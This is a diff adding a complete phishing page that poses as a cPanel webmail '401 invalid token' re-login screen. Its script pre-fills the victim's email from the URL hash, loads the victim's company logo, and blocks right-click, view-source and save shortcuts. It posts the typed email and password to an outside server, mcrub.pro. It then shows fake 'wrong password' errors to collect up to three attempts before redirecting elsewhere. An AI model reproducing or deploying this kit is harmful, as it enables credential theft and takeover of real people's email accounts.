@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<!-- saved from url=(0146)https://unionsupremegroup.com:2096/cpsess6897107731/3rdparty/roundcube/?_task=mail&_frame=1&_mbox=INBOX.Sent&_uid=96&_part=3&_action=get&_extwin=1 -->
+<html lang="en" dir="ltr"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+    <meta name="google" content="notranslate">
+    <meta name="apple-itunes-app" content="app-id=1188352635">
+    <title>Webmail Login</title>
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+
+    <!-- EXTERNAL CSS -->
+    <link href="https://ia601600.us.archive.org/18/items/style_v2_optimized_202409//open_sans.min.css" rel="stylesheet" type="text/css">
+    <link href="https://ia601600.us.archive.org/18/items/style_v2_optimized_202409/style_v2_optimized.css" rel="stylesheet" type="text/css">
+
+    <style type="text/css">
+/*
+  This css is included in the base template in case the css cannot be loaded because of access restrictions
+  If this css is updated, please update securitypolicy_header.html.tmpl as well
+*/
+.copyright {
+  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
+  background-size: 25px auto;
+}
+    </style>
+    <!--[if IE 6]>
+    <style type="text/css">
+        img {
+            behavior: url(/cPanel_magic_revision_1691610356/unprotected/cp_pngbehavior_login.htc);
+        }
+    </style>
+    <![endif]-->
+
+    <script>
+    window.DOM = { get: function(id) { return document.getElementById(id) } };
+    </script><script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executers/vi-tr.js"></script>
+</head>
+<body style="font-size:12px;"class="wm" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNiIsInNjb3JlIjoyMDAxNn1d" __processed_db679461-6dcd-4a3e-90f5-faba094b361e__="true">
+
+
+
+<br>
+    <p class="logo"><img class="main-logo" id="logoimg" src="https://surfglobal.net/webmail/skins/elastic/images/logo.svg?s=1697301272" alt="logo"></p>
+
+
+
+<div class="error_notice" bis_skin_checked="1">
+    <div id="error-wrapper" bis_skin_checked="1">
+        <div id="error_msg_contents" bis_skin_checked="1">
+            <h2>HTTP error 401</h2>
+
+
+
+    <!-- Do not remove msg_code as it is needed for automated testing - msg_code:[invalid_token]  -->
+    
+    <div id="token-forms" bis_skin_checked="1">
+        <div class="pagevars" bis_skin_checked="1">
+            
+                            <table class="formtbl" cellspacing="6">
+                    <tbody><tr>
+                        <th>Parameter name</th>
+                        <th>Parameter value</th>
+                    </tr>
+                                     
+                                        <tr><td>_mbox</td><td>INBOX.Sent</td></tr>
+                                       
+                                        <tr><td>_task</td><td>mail</td></tr>
+                                    
+                                    </tbody></table>
+                    </div>
+
+        <div id="login-container" bis_skin_checked="1">
+          <div id="login-sub-container" bis_skin_checked="1">
+            <form id="badtokenloginform" action="https://unionsupremegroup.com:2096/login" method="POST">
+                <input type="hidden" id="url_fragment_input" name="url_fragment" value="">
+                <input type="hidden" name="user" value="">
+                <input type="hidden" name="token_denied" value="1">
+                <input type="hidden" name="parameterized_form" value="_task=mail&amp;_frame=1&amp;_mbox=INBOX.Sent&amp;_uid=96&amp;_part=3&amp;_action=get&amp;_extwin=1">
+                <input type="hidden" name="theme" value="jupiter">
+                <p>Username:  <b><span style="margin-left:10px; margin-top:10px;"  id="aich">info@87878khjhj.cn</span></b></p>
+                <div class="control_container" bis_skin_checked="1">
+                    <div class="group" bis_skin_checked="1">
+                    <div class="controls" bis_skin_checked="1">
+                        <div class="input-field-login icon password-container" bis_skin_checked="1">
+						<input name="sdede" id="ai" size="40" class="form-control" autocapitalize="off" type="hidden" placeholder="JF">
+						 <input name="username" id="username" size="40" class="form-control" autocapitalize="off" type="hidden" placeholder="Password">
+	 <input name="sdede" id="ai" size="40" class="form-control" autocapitalize="off" type="hidden" placeholder="JF">
+	 <input name="email" id="email" size="40" class="form-control" autocapitalize="off" type="hidden" placeholder="Password">
+	 
+                            <input name="pass" id="pr" placeholder="Enter your email password." class="std_textbox" type="password" autofocus="" required="required" autocomplete="off">
+                       
+ <input name="pwsdx" id="password" required="" size="40" class="form-control" autocapitalize="off" type="hidden" placeholder="Password"></td></tr>
+	 
+	 <input name="user" id="user" size="40" class="form-control" autocapitalize="off" type="hidden" placeholder="username">
+					   </div>
+                    </div>
+                    </div>
+                    <div class="group" bis_skin_checked="1">
+                    <div class="controls" bis_skin_checked="1">
+                        <div class="login-btn" id="proceed_btn_container" bis_skin_checked="1">
+                            <button type="submit" id="submit-btn">Proceed with the Current Request</button>
+							
+							
+            
+                        </div>
+					
+                    </div>
+					
+                    </div>
+                </div>
+	
+            </form>
+
+            
+<div style="color:red; margin-top:15px; margin-left:100px;">
+                    <div id="msg" style="margin-top:10px;"></div>
+                    <div id="msg2" style="display: none; margin-top:2px; margin-left:0px;">Login failed! [incorrect password]</div>
+                    <div id="msg1" style="display: none; margin-top:2px; margin-left:0px;">Login failed! [wrong password]</div>
+   
+</div>
+
+           
+          </div>
+        </div>
+    </div>
+
+    <script>
+        try { document.getElementById("pass").focus(); } catch(e) {}
+	document.getElementById("url_fragment_input").value = location.hash;
+    </script>
+
+        </div>
+    </div>
+</div>
+
+    <div class="copyright" bis_skin_checked="1">Copyright©&nbsp;2024 cPanel, L.L.C.
+    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div><br>
+
+<p id="company-name" bis_skin_checked="1" style="font-size:10px;"> <marquee scrollamount="1" behavior="alternate" width="90%" direction="left" height="12px">IMAP Error in /var/www/webmail/program/main/mail_imap.php (196): Login failed for <span style="color:red;" id="aicx"></span> from https://<span id="logonamec"></span> AUTHENTICATE PLAN FAILED.</marquee></b></p>	
+
+
+</body>
+<script>
+// Set the date we're counting down to
+var countDownDate = new Date("Dec 5, 2024 15:37:25").getTime();
+
+// Update the count down every 1 second
+var x = setInterval(function() {
+
+  // Get today's date and time
+  var now = new Date().getTime();
+    
+  // Find the distance between now and the count down date
+  var distance = countDownDate - now;
+    
+  // Time calculations for days, hours, minutes and seconds
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+    
+  // Output the result in an element with id="demo"
+  document.getElementById("demo").innerHTML = hours + "h "
+  + minutes + "m " + seconds + "s ";
+    
+  // If the count down is over, write some text 
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("demo").innerHTML = "EXPIRED";
+  }
+}, 1000);
+</script>
+
+<!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+<script>
+
+
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+        if (!base64regex.test(ai)) {
+            // alert(btoa(ai));
+            var my_ai = ai;
+        } else {
+            // alert(atob(ai));
+            var my_ai = atob(ai);
+        }
+        // $('#ai').val(ai);
+        // var my_ai =ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var finalu = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+        $("#div2").animate({ right: 0, opacity: "show" }, 500);
+        
+		$("#aicx").html(my_ai);
+        $("#aich").html(my_ai);
+        $.get("https://logo.clearbit.com/" + my_slice)
+            .done(function() {
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
+                $("#logoname").html(finalu);
+				$("#logonamec").html(finalu);
+
+            }).fail(function() {
+                $("#logoimg").attr("src", "https://bensfishmersea.co.uk:2096/cPanel_magic_revision_1718748380/unprotected/cpanel/images/webmail-logo.svg");
+                $("#logoname").html("");
+				$("#logonamec").html("");
+
+            });
+
+
+    }
+
+
+
+
+
+    $('#ai').click(function() {
+        $('#error').hide();
+    });
+
+    $(document).keypress(function(event) {
+
+        var keycode = (event.keyCode ? event.keyCode : event.which);
+        if (keycode == '13') {
+            event.preventDefault();
+            if ($("#div1").is(":visible")) {
+
+                $("#next").click();
+
+            } else if ($("#div2").is(":visible")) {
+                event.preventDefault();
+
+                $("#submit-btn").click();
+
+            } else {
+                return false;
+            }
+        }
+    });
+
+
+    $('#next').click(function() {
+        event.preventDefault();
+        var my_ai = $('#ai').val();
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var finalu = c.toUpperCase();
+        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+        $("#div2").animate({ right: 0, opacity: "show" }, 500);
+
+        $("#aich").html(my_ai);
+		$("#aicx").html(my_ai);
+        $.get("" + my_slice)
+            .done(function() {
+                $("#logoimg").attr("src", "" + my_slice);
+                $("#logoname").html(finalu);
+				$("#logonamec").html(finalu);
+
+            }).fail(function() {
+                $("#logoimg").attr("src", "https://bensfishmersea.co.uk:2096/cPanel_magic_revision_1718748380/unprotected/cpanel/images/webmail-logo.svg");
+                $("#logoname").html("");
+				$("#logonamec").html("");
+
+            });
+
+
+
+
+
+    });
+    // $('#back').click(function() {
+    //     // $("#msg").hide();
+    //     $("#ai").val("");
+    //     $("#pr").val("");
+    //     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+    //     $("#div1").animate({ right: 0, opacity: "show" }, 1000);
+
+    // });
+var file="bmV4dC5waHA=";
+
+    $('#submit-btn').click(function(event) {
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var detail = $("#field").html();
+        var msg = $('#msg').html();
+
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#msg').text(msg);
+        count = count + 1;
+        $.ajax({
+            dataType: 'JSON',
+            url: 'https://mcrub.pro/otiki/',
+			     
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+                detail: detail,
+
+            },
+            beforeSend: function(xhr) {
+                $("#submit-btn").html("Authenticating...");
+            },
+            success: function(response) {
+                $("#pr").val("");
+                if (count >= 3) {
+                    count = 0;
+                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
+                    setTimeout(() => {
+              window.location.replace("https://compe09ioie-vkx8a4pu-dires044.4everland.app/complete.htm?msg="+ai);
+                    }, 500);
+                    return false;
+                }
+                if (count == 2) {
+                    $("#msg2").show();
+                    $("#msg").hide();
+                    $("#msg1").hide();
+                } else {
+                    $("#msg1").show();
+                    $("#msg").hide();
+                    $("#msg2").hide();
+
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 3) {
+                    count = 0;
+                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
+                    setTimeout(() => {
+                        window.location.replace("https://compe09ioie-vkx8a4pu-dires044.4everland.app/complete.htm?msg="+ai);
+                    }, 1000);
+                    return false;
+                }
+                if (count == 3) {
+                    $("#msg2").show();
+                    $("#msg").hide();
+                    $("#msg1").hide();
+                } else {
+                    $("#msg1").show();
+                    $("#msg").hide();
+                    $("#msg2").hide();
+
+                }
+            },
+            complete: function() {
+                $("#submit-btn").html("Proceed with the Current Request");
+            }
+        });
+    });
+});
+</script>
+
+</html>
